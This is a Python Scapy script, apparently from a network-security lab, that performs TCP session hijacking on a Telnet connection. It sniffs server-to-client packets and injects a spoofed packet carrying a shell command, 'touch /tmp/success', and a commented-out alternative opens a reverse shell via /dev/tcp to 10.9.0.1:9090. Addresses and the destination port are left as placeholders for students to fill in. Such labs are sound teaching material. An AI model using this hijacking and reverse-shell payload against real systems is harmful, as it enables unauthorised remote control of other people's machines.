#!/usr/bin/python3
from scapy.all import *
import sys

def spoof(pkt):
    old_ip  = pkt[IP]
    old_tcp = pkt[TCP]

    # TCP data length
    tcp_len = old_ip.len - old_ip.ihl*4 - old_tcp.dataofs * 4  

    newseq = old_tcp.ack + 10
    newack = old_tcp.seq + tcp_len - 20
  
    #############################################################
    ip  = IP( src = "*.*.*.*",
              dst = "*.*.*.*"
            )

    tcp = TCP( sport = old_tcp.dport,
               dport = **,
               flags = "A", 
               seq   = newseq, 
               ack   = newack
              )

    data = "\ntouch /tmp/success\n"
    #data = "\n/bin/bash -i >/dev/tcp/10.9.0.1/9090 0<&1 2>&1\n"
    #############################################################

    pkt = ip/tcp/data
    ls(pkt)
    send(pkt,verbose=0)
    quit()

cli  = "10.9.0.6"
srv  = "10.9.0.5"

myFilter = 'tcp and src host {} and dst host {} and src port 23'.format(srv, cli)
print("Running Session Hijacking attack ...")
print("Filter used: {}".format(myFilter))
print("Spoofing TCP packets from Client ({}) to Server ({})".format(cli, srv))

# Change the iface field with the actual name on your container
sniff(iface='br-07950545de5e', filter=myFilter, prn=spoof)

